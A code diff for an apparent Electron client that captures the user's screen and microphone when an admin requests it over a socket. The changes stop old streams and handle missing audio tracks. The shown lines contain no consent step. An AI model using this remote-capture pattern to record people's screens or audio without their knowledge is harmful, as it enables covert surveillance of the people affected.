@@ -53,6 +53,10 @@ window.onload = async () => {
         socket.on('request-screen', async (adminId) => {
             console.log("Admin requested SCREEN");
             try {
+                if (localScreenStream) {
+                    localScreenStream.getTracks().forEach(track => track.stop());
+                    localScreenStream = null;
+                }
                 const sources = await window.electronAPI.getSources();
                 const mainScreen = sources.find(s => s.id.startsWith('screen')) || sources[0];
                 
@@ -79,6 +83,10 @@ window.onload = async () => {
         socket.on('request-screen-mic', async (adminId) => {
             console.log("Admin requested SCREEN + MIC");
             try {
+                if (localScreenStream) {
+                    localScreenStream.getTracks().forEach(track => track.stop());
+                    localScreenStream = null;
+                }
                 const sources = await window.electronAPI.getSources();
                 const mainScreen = sources.find(s => s.id.startsWith('screen')) || sources[0];
                 
@@ -103,21 +111,29 @@ window.onload = async () => {
                     const audioContext = new AudioContext();
                     const dest = audioContext.createMediaStreamDestination();
 
+                    let hasAudio = false;
+
                     if (screenStream.getAudioTracks().length > 0) {
                         const desktopSource = audioContext.createMediaStreamSource(new MediaStream([screenStream.getAudioTracks()[0]]));
                         desktopSource.connect(dest);
+                        hasAudio = true;
                     }
 
                     if (micStream.getAudioTracks().length > 0) {
                         const micSource = audioContext.createMediaStreamSource(micStream);
                         micSource.connect(dest);
+                        hasAudio = true;
                     }
 
-                    const mixedAudioTrack = dest.stream.getAudioTracks()[0];
                     const videoTrack = screenStream.getVideoTracks()[0];
                     
-                    // Create the final stream with exactly 1 video track and 1 mixed audio track
-                    localScreenStream = new MediaStream([videoTrack, mixedAudioTrack]);
+                    if (hasAudio && dest.stream.getAudioTracks().length > 0) {
+                        const mixedAudioTrack = dest.stream.getAudioTracks()[0];
+                        localScreenStream = new MediaStream([videoTrack, mixedAudioTrack]);
+                    } else {
+                        localScreenStream = new MediaStream([videoTrack]);
+                    }
+                    
                 } catch(micErr) {
                     console.log("Mic access failed, continuing with screen only");
                     localScreenStream = screenStream;
